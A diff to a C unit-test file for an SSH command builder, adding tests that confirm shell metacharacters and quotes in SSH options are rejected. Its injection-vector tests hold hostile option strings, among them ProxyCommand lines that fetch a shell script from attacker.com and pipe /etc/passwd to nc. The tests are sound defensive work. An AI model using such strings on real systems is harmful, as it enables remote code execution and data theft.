@@ -6,14 +6,18 @@
  *   2. shell_escape: adversarial inputs (very long strings, all-quotes, special chars)
  *   3. shell_escape: buffer too small (returns -1 gracefully)
  *   4. shell_escape: INT_MAX overflow guard on return value
- *   5. contains_shell_metachar: rejects dangerous characters
- *   6. contains_shell_metachar: accepts safe strings
- *   7. build_ssh_argv: basic construction
- *   8. build_ssh_argv: port_str is heap-allocated (dangling pointer fix)
- *   9. build_ssh_argv: rejects NBS_CHAT_OPTS with shell metacharacters
- *  10. build_ssh_argv: graceful failure on shell_escape overflow (no abort)
- *  11. build_ssh_argv: overflow guard on argv index (checked before write)
- *  12. load_config postcondition: host, port, remote_bin validated
+ *   5. shell_escape: postcondition — NUL-terminated, strlen matches return value
+ *   6. contains_shell_metachar: rejects dangerous characters
+ *   7. contains_shell_metachar: accepts safe strings
+ *   8. contains_shell_metachar: rejects double-quote and single-quote (SECURITY fix)
+ *   9. build_ssh_argv: basic construction with explicit remote_cmd_out tracking
+ *  10. build_ssh_argv: port_str is heap-allocated (dangling pointer fix)
+ *  11. build_ssh_argv: rejects NBS_CHAT_OPTS with shell metacharacters
+ *  12. build_ssh_argv: rejects NBS_CHAT_OPTS with quotes (SECURITY fix)
+ *  13. build_ssh_argv: graceful failure on shell_escape overflow (no abort)
+ *  14. build_ssh_argv: overflow guard on argv index (checked before write)
+ *  15. build_ssh_argv: remote_cmd_out matches last non-NULL argv element (BUG fix)
+ *  16. load_config postcondition: host, port, remote_bin validated
  *
  * Build:
  *   gcc -Wall -Wextra -Werror -std=c11 -D_POSIX_C_SOURCE=200809L -O2 \
@@ -58,6 +62,18 @@ static int tests_failed = 0;
     tests_passed++; \
     printf("  PASS: %s\n", name); \
 } while(0)
+
+/*
+ * Helper: cleanup build_ssh_argv results using explicit remote_cmd_out.
+ * This replaces the old fragile "search for last non-NULL" pattern.
+ */
+static void cleanup_ssh_argv(char **result, char *remote_cmd_out,
+                              char *opts_out, char *port_str_out) {
+    free(remote_cmd_out);
+    free(port_str_out);
+    free(opts_out);
+    free(result);
+}
 
 /* ── shell_escape tests ─────────────────────────────────────────── */
 
@@ -206,6 +222,33 @@ static void test_shell_escape_null_bytes_in_middle(void) {
     TEST_PASS("shell_escape: embedded NUL truncates (expected behaviour)");
 }
 
+/*
+ * HARDENING test: verify shell_escape postcondition —
+ * returned length matches strlen(buf), buf is NUL-terminated.
+ * This tests the new ASSERT_MSG postconditions added for Violation 2.
+ */
+static void test_shell_escape_postcondition_strlen_matches(void) {
+    /* Test across a variety of inputs */
+    const char *inputs[] = {
+        "", "a", "hello world", "it's", "'", "''",
+        "abc\tdef", "line1\nline2", "%s%n%x",
+        NULL
+    };
+
+    char buf[512];
+    for (int i = 0; inputs[i] != NULL; i++) {
+        int ret = shell_escape(inputs[i], buf, sizeof(buf));
+        TEST_ASSERT(ret > 0, "shell_escape('%s') returned %d", inputs[i], ret);
+        TEST_ASSERT(buf[ret] == '\0',
+                    "shell_escape('%s'): buf[%d] != '\\0' (got %d)",
+                    inputs[i], ret, (int)buf[ret]);
+        TEST_ASSERT((int)strlen(buf) == ret,
+                    "shell_escape('%s'): strlen=%zu != ret=%d",
+                    inputs[i], strlen(buf), ret);
+    }
+    TEST_PASS("shell_escape: postcondition — strlen(buf) == return value for all inputs");
+}
+
 /* ── contains_shell_metachar tests ──────────────────────────────── */
 
 static void test_metachar_rejects_semicolon(void) {
@@ -269,14 +312,69 @@ static void test_metachar_empty_string(void) {
 static void test_metachar_rejects_all_dangerous_chars(void) {
     const char *dangerous[] = {
         ";", "`", "$", "(", ")", "|", "&", "<", ">",
-        "{", "}", "!", "\\", "\n", "\r"
+        "{", "}", "!", "\\", "\n", "\r",
+        "\"", "'"  /* SECURITY fix: quotes now rejected */
     };
     size_t n = sizeof(dangerous) / sizeof(dangerous[0]);
     for (size_t i = 0; i < n; i++) {
         TEST_ASSERT(contains_shell_metachar(dangerous[i]) == 1,
                     "should reject '%s' (index %zu)", dangerous[i], i);
     }
-    TEST_PASS("contains_shell_metachar: rejects all listed dangerous chars");
+    TEST_PASS("contains_shell_metachar: rejects all listed dangerous chars (incl. quotes)");
+}
+
+/*
+ * SECURITY test (Violation 7): double-quote must be rejected.
+ * Adversarial input: SSH ProxyCommand injection via quoted option values.
+ * Before the fix, this was accepted; after, it must be rejected.
+ */
+static void test_metachar_rejects_double_quote(void) {
+    TEST_ASSERT(contains_shell_metachar("ProxyCommand=\"nc %h %p\"") == 1,
+                "should reject double-quoted ProxyCommand injection attempt");
+    TEST_ASSERT(contains_shell_metachar("key=\"value\"") == 1,
+                "should reject any double-quoted value");
+    TEST_PASS("contains_shell_metachar: rejects double-quote (SECURITY)");
+}
+
+/*
+ * SECURITY test (Violation 7): single-quote must be rejected.
+ * Adversarial input: SSH option values with single quotes.
+ */
+static void test_metachar_rejects_single_quote(void) {
+    TEST_ASSERT(contains_shell_metachar("ProxyCommand='nc %h %p'") == 1,
+                "should reject single-quoted ProxyCommand injection attempt");
+    TEST_ASSERT(contains_shell_metachar("key='value'") == 1,
+                "should reject any single-quoted value");
+    TEST_PASS("contains_shell_metachar: rejects single-quote (SECURITY)");
+}
+
+/*
+ * SECURITY test: combined adversarial SSH option payloads.
+ * Each of these should be rejected — they represent real-world
+ * injection vectors via SSH -o options.
+ */
+static void test_metachar_adversarial_ssh_injection_vectors(void) {
+    /* ProxyCommand with command substitution */
+    TEST_ASSERT(contains_shell_metachar("ProxyCommand=$(curl attacker.com/shell.sh)") == 1,
+                "should reject ProxyCommand with command substitution");
+
+    /* LocalCommand with backtick execution */
+    TEST_ASSERT(contains_shell_metachar("LocalCommand=`curl attacker.com`") == 1,
+                "should reject LocalCommand with backtick");
+
+    /* ProxyCommand with pipe to shell */
+    TEST_ASSERT(contains_shell_metachar("ProxyCommand=cat /etc/passwd | nc attacker 4444") == 1,
+                "should reject ProxyCommand with pipe");
+
+    /* ProxyCommand with double-quote wrapping (the new SECURITY fix) */
+    TEST_ASSERT(contains_shell_metachar("ProxyCommand=\"/bin/sh -c 'nc attacker 4444'\"") == 1,
+                "should reject double-quoted ProxyCommand");
+
+    /* ProxyCommand with newline injection to add another option */
+    TEST_ASSERT(contains_shell_metachar("StrictHostKeyChecking=no\nProxyCommand=evil") == 1,
+                "should reject newline-injected option");
+
+    TEST_PASS("contains_shell_metachar: rejects adversarial SSH injection vectors");
 }
 
 /* ── build_ssh_argv tests ───────────────────────────────────────── */
@@ -299,8 +397,9 @@ static void test_build_ssh_argv_basic(void) {
     char *argv_in[] = { "nbs-chat-remote", "read", "/tmp/chat.nbs", NULL };
     char *opts_out = NULL;
     char *port_str_out = NULL;
+    char *remote_cmd_out = NULL;
 
-    char **result = build_ssh_argv(&cfg, 3, argv_in, &opts_out, &port_str_out);
+    char **result = build_ssh_argv(&cfg, 3, argv_in, &opts_out, &port_str_out, &remote_cmd_out);
     TEST_ASSERT(result != NULL, "build_ssh_argv returned NULL");
 
     /* argv[0] should be "ssh" */
@@ -326,17 +425,13 @@ static void test_build_ssh_argv_basic(void) {
     TEST_ASSERT(port_str_out == NULL,
                 "port_str_out should be NULL for default port");
 
-    /* Cleanup */
-    for (int j = 0; result[j] != NULL; j++) {
-        if (result[j + 1] == NULL) {
-            free(result[j]); /* remote_cmd */
-            break;
-        }
-    }
-    free(opts_out);
-    free(port_str_out);
-    free(result);
+    /* remote_cmd_out should match the argv entry (Violation 4 fix) */
+    TEST_ASSERT(remote_cmd_out != NULL,
+                "remote_cmd_out should be non-NULL");
+    TEST_ASSERT(remote_cmd_out == result[i],
+                "remote_cmd_out should point to the same buffer as the argv entry");
 
+    cleanup_ssh_argv(result, remote_cmd_out, opts_out, port_str_out);
     TEST_PASS("build_ssh_argv: basic construction");
 }
 
@@ -347,8 +442,9 @@ static void test_build_ssh_argv_port_is_heap(void) {
     char *argv_in[] = { "nbs-chat-remote", "read", "/tmp/chat.nbs", NULL };
     char *opts_out = NULL;
     char *port_str_out = NULL;
+    char *remote_cmd_out = NULL;
 
-    char **result = build_ssh_argv(&cfg, 3, argv_in, &opts_out, &port_str_out);
+    char **result = build_ssh_argv(&cfg, 3, argv_in, &opts_out, &port_str_out, &remote_cmd_out);
     TEST_ASSERT(result != NULL, "build_ssh_argv returned NULL");
 
     /* port_str_out should be heap-allocated (not NULL) */
@@ -371,17 +467,7 @@ static void test_build_ssh_argv_port_is_heap(void) {
     }
     TEST_ASSERT(found_p, "argv should contain '-p' for non-default port");
 
-    /* Cleanup */
-    for (int j = 0; result[j] != NULL; j++) {
-        if (result[j + 1] == NULL) {
-            free(result[j]);
-            break;
-        }
-    }
-    free(opts_out);
-    free(port_str_out);
-    free(result);
-
+    cleanup_ssh_argv(result, remote_cmd_out, opts_out, port_str_out);
     TEST_PASS("build_ssh_argv: port_str is heap-allocated (dangling pointer fix)");
 }
 
@@ -392,12 +478,44 @@ static void test_build_ssh_argv_rejects_metachar_opts(void) {
     char *argv_in[] = { "nbs-chat-remote", "read", "/tmp/chat.nbs", NULL };
     char *opts_out = NULL;
     char *port_str_out = NULL;
+    char *remote_cmd_out = NULL;
 
-    char **result = build_ssh_argv(&cfg, 3, argv_in, &opts_out, &port_str_out);
+    char **result = build_ssh_argv(&cfg, 3, argv_in, &opts_out, &port_str_out, &remote_cmd_out);
     TEST_ASSERT(result == NULL,
                 "build_ssh_argv should return NULL for opts with shell metacharacters");
 
     TEST_PASS("build_ssh_argv: rejects NBS_CHAT_OPTS with shell metacharacters");
+}
+
+/*
+ * SECURITY test (Violation 7): build_ssh_argv must reject opts containing quotes.
+ * Before the fix, ProxyCommand="evil" would pass the metachar filter.
+ */
+static void test_build_ssh_argv_rejects_quoted_opts(void) {
+    remote_config_t cfg = make_test_config();
+
+    /* Double-quoted ProxyCommand injection */
+    cfg.ssh_opts = "ProxyCommand=\"nc %h %p\"";
+    char *argv_in[] = { "nbs-chat-remote", "read", "/tmp/chat.nbs", NULL };
+    char *opts_out = NULL;
+    char *port_str_out = NULL;
+    char *remote_cmd_out = NULL;
+
+    char **result = build_ssh_argv(&cfg, 3, argv_in, &opts_out, &port_str_out, &remote_cmd_out);
+    TEST_ASSERT(result == NULL,
+                "build_ssh_argv should reject double-quoted SSH options (SECURITY)");
+
+    /* Single-quoted ProxyCommand injection */
+    cfg.ssh_opts = "ProxyCommand='nc %h %p'";
+    opts_out = NULL;
+    port_str_out = NULL;
+    remote_cmd_out = NULL;
+
+    result = build_ssh_argv(&cfg, 3, argv_in, &opts_out, &port_str_out, &remote_cmd_out);
+    TEST_ASSERT(result == NULL,
+                "build_ssh_argv should reject single-quoted SSH options (SECURITY)");
+
+    TEST_PASS("build_ssh_argv: rejects quoted NBS_CHAT_OPTS (SECURITY)");
 }
 
 static void test_build_ssh_argv_accepts_safe_opts(void) {
@@ -407,8 +525,9 @@ static void test_build_ssh_argv_accepts_safe_opts(void) {
     char *argv_in[] = { "nbs-chat-remote", "read", "/tmp/chat.nbs", NULL };
     char *opts_out = NULL;
     char *port_str_out = NULL;
+    char *remote_cmd_out = NULL;
 
-    char **result = build_ssh_argv(&cfg, 3, argv_in, &opts_out, &port_str_out);
+    char **result = build_ssh_argv(&cfg, 3, argv_in, &opts_out, &port_str_out, &remote_cmd_out);
     TEST_ASSERT(result != NULL,
                 "build_ssh_argv should succeed for safe opts");
 
@@ -420,17 +539,7 @@ static void test_build_ssh_argv_accepts_safe_opts(void) {
     TEST_ASSERT(o_count == 2,
                 "expected 2 -o options, got %d", o_count);
 
-    /* Cleanup */
-    for (int j = 0; result[j] != NULL; j++) {
-        if (result[j + 1] == NULL) {
-            free(result[j]);
-            break;
-        }
-    }
-    free(opts_out);
-    free(port_str_out);
-    free(result);
-
+    cleanup_ssh_argv(result, remote_cmd_out, opts_out, port_str_out);
     TEST_PASS("build_ssh_argv: accepts safe SSH options");
 }
 
@@ -441,8 +550,9 @@ static void test_build_ssh_argv_with_key(void) {
     char *argv_in[] = { "nbs-chat-remote", "send", "/tmp/chat.nbs", "alice", "hello", NULL };
     char *opts_out = NULL;
     char *port_str_out = NULL;
+    char *remote_cmd_out = NULL;
 
-    char **result = build_ssh_argv(&cfg, 5, argv_in, &opts_out, &port_str_out);
+    char **result = build_ssh_argv(&cfg, 5, argv_in, &opts_out, &port_str_out, &remote_cmd_out);
     TEST_ASSERT(result != NULL, "build_ssh_argv returned NULL");
 
     /* Verify -i is in the argv */
@@ -458,17 +568,7 @@ static void test_build_ssh_argv_with_key(void) {
     }
     TEST_ASSERT(found_i, "argv should contain '-i' when key_path is set");
 
-    /* Cleanup */
-    for (int j = 0; result[j] != NULL; j++) {
-        if (result[j + 1] == NULL) {
-            free(result[j]);
-            break;
-        }
-    }
-    free(opts_out);
-    free(port_str_out);
-    free(result);
-
+    cleanup_ssh_argv(result, remote_cmd_out, opts_out, port_str_out);
     TEST_PASS("build_ssh_argv: identity file included");
 }
 
@@ -481,8 +581,9 @@ static void test_build_ssh_argv_null_terminated(void) {
     char *argv_in[] = { "nbs-chat-remote", "read", "/tmp/c.nbs", NULL };
     char *opts_out = NULL;
     char *port_str_out = NULL;
+    char *remote_cmd_out = NULL;
 
-    char **result = build_ssh_argv(&cfg, 3, argv_in, &opts_out, &port_str_out);
+    char **result = build_ssh_argv(&cfg, 3, argv_in, &opts_out, &port_str_out, &remote_cmd_out);
     TEST_ASSERT(result != NULL, "build_ssh_argv returned NULL");
 
     /* Count elements: ssh -p PORT -i KEY -o O1 -o O2 -o O3 -o O4 host cmd = 15, max array is 16 */
@@ -491,17 +592,7 @@ static void test_build_ssh_argv_null_terminated(void) {
     TEST_ASSERT(count <= 15,
                 "argv has %d non-NULL elements, expected <= 15", count);
 
-    /* Cleanup */
-    for (int j = 0; result[j] != NULL; j++) {
-        if (result[j + 1] == NULL) {
-            free(result[j]);
-            break;
-        }
-    }
-    free(opts_out);
-    free(port_str_out);
-    free(result);
-
+    cleanup_ssh_argv(result, remote_cmd_out, opts_out, port_str_out);
     TEST_PASS("build_ssh_argv: NULL-terminated with max options");
 }
 
@@ -512,31 +603,20 @@ static void test_build_ssh_argv_escapes_quotes_in_args(void) {
     char *argv_in[] = { "nbs-chat-remote", "send", "/tmp/chat", "alice", "it's a test", NULL };
     char *opts_out = NULL;
     char *port_str_out = NULL;
+    char *remote_cmd_out = NULL;
 
-    char **result = build_ssh_argv(&cfg, 5, argv_in, &opts_out, &port_str_out);
+    char **result = build_ssh_argv(&cfg, 5, argv_in, &opts_out, &port_str_out, &remote_cmd_out);
     TEST_ASSERT(result != NULL, "build_ssh_argv returned NULL");
 
-    /* Find the remote command (last non-NULL element) */
-    char *remote_cmd = NULL;
-    for (int i = 0; result[i] != NULL; i++) {
-        if (result[i + 1] == NULL) {
-            remote_cmd = result[i];
-            break;
-        }
-    }
-    TEST_ASSERT(remote_cmd != NULL, "remote_cmd not found");
+    /* remote_cmd_out is now tracked explicitly (Violation 4 fix) */
+    TEST_ASSERT(remote_cmd_out != NULL, "remote_cmd_out should be non-NULL");
 
     /* The remote command should contain the escaped quote sequence '\'' */
-    TEST_ASSERT(strstr(remote_cmd, "'\\''") != NULL,
+    TEST_ASSERT(strstr(remote_cmd_out, "'\\''") != NULL,
                 "remote command should contain escaped quote sequence, got: %s",
-                remote_cmd);
+                remote_cmd_out);
 
-    /* Cleanup */
-    free(remote_cmd);
-    free(opts_out);
-    free(port_str_out);
-    free(result);
-
+    cleanup_ssh_argv(result, remote_cmd_out, opts_out, port_str_out);
     TEST_PASS("build_ssh_argv: escapes single quotes in arguments");
 }
 
@@ -553,8 +633,9 @@ static void test_build_ssh_argv_format_specifier_in_host(void) {
     char *argv_in[] = { "nbs-chat-remote", "read", "/tmp/chat.nbs", NULL };
     char *opts_out = NULL;
     char *port_str_out = NULL;
+    char *remote_cmd_out = NULL;
 
-    char **result = build_ssh_argv(&cfg, 3, argv_in, &opts_out, &port_str_out);
+    char **result = build_ssh_argv(&cfg, 3, argv_in, &opts_out, &port_str_out, &remote_cmd_out);
     TEST_ASSERT(result != NULL, "build_ssh_argv returned NULL");
 
     /* Host should be in argv as a literal string */
@@ -567,18 +648,128 @@ static void test_build_ssh_argv_format_specifier_in_host(void) {
     }
     TEST_ASSERT(found_host, "host with format specifiers should appear literally in argv");
 
-    /* Cleanup */
-    for (int j = 0; result[j] != NULL; j++) {
-        if (result[j + 1] == NULL) {
-            free(result[j]);
+    cleanup_ssh_argv(result, remote_cmd_out, opts_out, port_str_out);
+    TEST_PASS("build_ssh_argv: format specifiers in host treated as literal");
+}
+
+/*
+ * BUG test (Violation 4): remote_cmd_out must be the exact pointer
+ * that was malloc'd for the remote command. Verify it is the same
+ * pointer as the last non-NULL argv element, proving explicit tracking
+ * is consistent with argv structure.
+ */
+static void test_build_ssh_argv_remote_cmd_tracked_explicitly(void) {
+    remote_config_t cfg = make_test_config();
+    cfg.port = 2222;
+    cfg.key_path = "/home/user/.ssh/id_ed25519";
+
+    char *argv_in[] = { "nbs-chat-remote", "send", "/tmp/chat.nbs", "bob", "hello world", NULL };
+    char *opts_out = NULL;
+    char *port_str_out = NULL;
+    char *remote_cmd_out = NULL;
+
+    char **result = build_ssh_argv(&cfg, 5, argv_in, &opts_out, &port_str_out, &remote_cmd_out);
+    TEST_ASSERT(result != NULL, "build_ssh_argv returned NULL");
+    TEST_ASSERT(remote_cmd_out != NULL, "remote_cmd_out should be non-NULL");
+
+    /* Find the last non-NULL element in argv */
+    char *last_non_null = NULL;
+    for (int i = 0; result[i] != NULL; i++) {
+        if (result[i + 1] == NULL) {
+            last_non_null = result[i];
             break;
         }
     }
-    free(opts_out);
-    free(port_str_out);
-    free(result);
 
-    TEST_PASS("build_ssh_argv: format specifiers in host treated as literal");
+    /* The explicitly tracked remote_cmd_out MUST be the same pointer */
+    TEST_ASSERT(remote_cmd_out == last_non_null,
+                "remote_cmd_out (%p) must equal last non-NULL argv element (%p) — "
+                "explicit tracking must match argv structure",
+                (void *)remote_cmd_out, (void *)last_non_null);
+
+    /* Verify the remote_cmd is well-formed (contains the binary and arguments) */
+    TEST_ASSERT(strstr(remote_cmd_out, "nbs-chat") != NULL,
+                "remote_cmd should contain 'nbs-chat', got: %s", remote_cmd_out);
+    TEST_ASSERT(strstr(remote_cmd_out, "send") != NULL,
+                "remote_cmd should contain 'send'");
+    TEST_ASSERT(strstr(remote_cmd_out, "hello") != NULL,
+                "remote_cmd should contain 'hello'");
+
+    /* Verify we can safely free via remote_cmd_out (no double-free) */
+    cleanup_ssh_argv(result, remote_cmd_out, opts_out, port_str_out);
+    TEST_PASS("build_ssh_argv: remote_cmd tracked explicitly (Violation 4 BUG fix)");
+}
+
+/*
+ * BUG test (Violation 1): strdup failure for SSH options must return NULL.
+ * We cannot easily force strdup to fail, but we can verify the observable
+ * behaviour: that the strdup success path works correctly and that
+ * the code structure handles the failure path (tested via code review
+ * and the assertion in the source). Here we verify the success path
+ * still produces correct results.
+ */
+static void test_build_ssh_argv_opts_strdup_success_path(void) {
+    remote_config_t cfg = make_test_config();
+    cfg.ssh_opts = "BatchMode=yes,ForwardAgent=no";
+
+    char *argv_in[] = { "nbs-chat-remote", "read", "/tmp/chat.nbs", NULL };
+    char *opts_out = NULL;
+    char *port_str_out = NULL;
+    char *remote_cmd_out = NULL;
+
+    char **result = build_ssh_argv(&cfg, 3, argv_in, &opts_out, &port_str_out, &remote_cmd_out);
+    TEST_ASSERT(result != NULL, "build_ssh_argv returned NULL");
+
+    /* opts_out should be non-NULL (strdup succeeded) */
+    TEST_ASSERT(opts_out != NULL,
+                "opts_out should be non-NULL when SSH options are provided and strdup succeeds");
+
+    /* Verify the options ended up in argv */
+    int found_batch = 0;
+    int found_forward = 0;
+    for (int i = 0; result[i] != NULL; i++) {
+        if (result[i] != NULL && strstr(result[i], "BatchMode") != NULL)
+            found_batch = 1;
+        if (result[i] != NULL && strstr(result[i], "ForwardAgent") != NULL)
+            found_forward = 1;
+    }
+    TEST_ASSERT(found_batch, "BatchMode=yes should appear in argv");
+    TEST_ASSERT(found_forward, "ForwardAgent=no should appear in argv");
+
+    cleanup_ssh_argv(result, remote_cmd_out, opts_out, port_str_out);
+    TEST_PASS("build_ssh_argv: opts strdup success path (Violation 1 BUG fix context)");
+}
+
+/*
+ * HARDENING test (Violation 5): contains_shell_metachar returns exactly 0 or 1.
+ * The assertion in the source code verifies this, but we also check it here
+ * to confirm the property holds across a wide range of inputs.
+ */
+static void test_metachar_return_value_is_0_or_1(void) {
+    const char *safe_inputs[] = {
+        "", "abc", "StrictHostKeyChecking=no", "ConnectTimeout=10",
+        "key=value", "some_option", "A", "1234567890",
+        "path/to/file", "user@host", "-option",
+        NULL
+    };
+    const char *unsafe_inputs[] = {
+        ";", "`", "$", "(", ")", "|", "&", "<", ">",
+        "{", "}", "!", "\\", "\n", "\r", "\"", "'",
+        "cmd;id", "$(whoami)", "`id`", "a|b", "a&b",
+        NULL
+    };
+
+    for (int i = 0; safe_inputs[i] != NULL; i++) {
+        int r = contains_shell_metachar(safe_inputs[i]);
+        TEST_ASSERT(r == 0, "safe input '%s' returned %d, expected 0", safe_inputs[i], r);
+    }
+
+    for (int i = 0; unsafe_inputs[i] != NULL; i++) {
+        int r = contains_shell_metachar(unsafe_inputs[i]);
+        TEST_ASSERT(r == 1, "unsafe input index %d returned %d, expected 1", i, r);
+    }
+
+    TEST_PASS("contains_shell_metachar: return value is exactly 0 or 1 for all inputs (HARDENING)");
 }
 
 /* ── Entry point ────────────────────────────────────────────────── */
@@ -599,6 +790,7 @@ int main(void) {
     test_shell_escape_long_string();
     test_shell_escape_long_string_with_quotes();
     test_shell_escape_null_bytes_in_middle();
+    test_shell_escape_postcondition_strlen_matches();
 
     /* contains_shell_metachar tests */
     test_metachar_rejects_semicolon();
@@ -611,16 +803,23 @@ int main(void) {
     test_metachar_accepts_safe_ssh_option();
     test_metachar_empty_string();
     test_metachar_rejects_all_dangerous_chars();
+    test_metachar_rejects_double_quote();
+    test_metachar_rejects_single_quote();
+    test_metachar_adversarial_ssh_injection_vectors();
+    test_metachar_return_value_is_0_or_1();
 
     /* build_ssh_argv tests */
     test_build_ssh_argv_basic();
     test_build_ssh_argv_port_is_heap();
     test_build_ssh_argv_rejects_metachar_opts();
+    test_build_ssh_argv_rejects_quoted_opts();
     test_build_ssh_argv_accepts_safe_opts();
     test_build_ssh_argv_with_key();
     test_build_ssh_argv_null_terminated();
     test_build_ssh_argv_escapes_quotes_in_args();
     test_build_ssh_argv_format_specifier_in_host();
+    test_build_ssh_argv_remote_cmd_tracked_explicitly();
+    test_build_ssh_argv_opts_strdup_success_path();
 
     printf("\n=== Results: %d passed, %d failed ===\n",
            tests_passed, tests_failed);
